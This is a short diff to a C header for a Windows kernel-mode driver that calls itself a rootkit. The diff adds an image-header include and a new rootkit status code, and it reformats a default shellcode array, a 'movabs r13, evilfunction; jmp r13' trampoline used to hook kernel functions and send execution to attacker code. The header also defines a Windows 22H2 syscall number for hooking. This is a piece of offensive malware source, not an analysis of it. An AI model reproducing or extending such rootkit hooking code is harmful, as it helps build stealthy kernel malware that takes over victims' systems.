@@ -2,6 +2,7 @@
 #include <ntifs.h>
 #include <wdm.h>
 #include <ntddk.h>
+#include <ntimage.h>
 #include <minwindef.h>
 #include "problematic.h"
 #define NTQUERYEX_SYSCALL22H2 0x014b
@@ -14,8 +15,7 @@
 
 
 // Default shellcode for hooks:
-CONST BYTE DEFAULT_SHELLCODE[] = {  // 0x90, 0x90, 0x90, 0x90, 0x90,  // nop * 5 to pad also for /Ex
-									0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
+CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
 									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)
 
 
@@ -792,6 +792,7 @@ typedef enum _ROOTKIT_STATUS {
 	ROOTKSTATUS_NOTSUPPORTED = 0xFF000011,
 	ROOTKSTATUS_NOTINRELRANGE = 0xFF000012,
 	ROOTKSTATUS_PROCESSEPRC = 0XFF000013,
+	ROOTKSTATUS_USERSPACE = 0XFF000014,
 }ROOTKIT_STATUS, * PROOTKIT_STATUS;
 
 
